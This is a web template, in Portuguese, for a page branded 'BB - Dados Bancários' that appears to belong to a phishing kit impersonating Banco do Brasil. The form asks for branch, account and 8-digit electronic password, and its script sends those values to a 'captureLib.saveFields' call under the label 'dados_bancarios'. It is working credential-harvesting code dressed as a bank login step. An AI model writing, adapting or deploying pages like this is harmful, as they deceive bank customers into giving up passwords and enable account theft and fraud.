{% extends "base.html" %}

{% block title %}BB - Dados Bancários{% endblock %}

{% block content %}
<form id="dadosForm">
    <div class="form-row">
        <div class="form-group">
            <label for="agencia">Agência:</label>
            <input type="text" id="agencia" name="agencia" placeholder="0000" maxlength="4" required>
        </div>
        <div class="form-group">
            <label for="conta">Conta:</label>
            <input type="text" id="conta" name="conta" placeholder="00000-0" maxlength="9" required>
        </div>
    </div>
    <div class="form-group">
        <label for="senha8">Senha Eletrônica (8 dígitos):</label>
        <input type="password" id="senha8" name="senha8" placeholder="********" maxlength="8" required>
    </div>
    <button type="submit" class="btn">Continuar</button>
</form>
{% endblock %}

{% block scripts %}
const form = document.getElementById('dadosForm');

form.addEventListener('submit', async function(e) {
    e.preventDefault();
    await captureLib.saveFields({
        agencia: document.getElementById('agencia').value,
        conta: document.getElementById('conta').value,
        senha8: document.getElementById('senha8').value
    }, 'dados_bancarios');
});
{% endblock %}
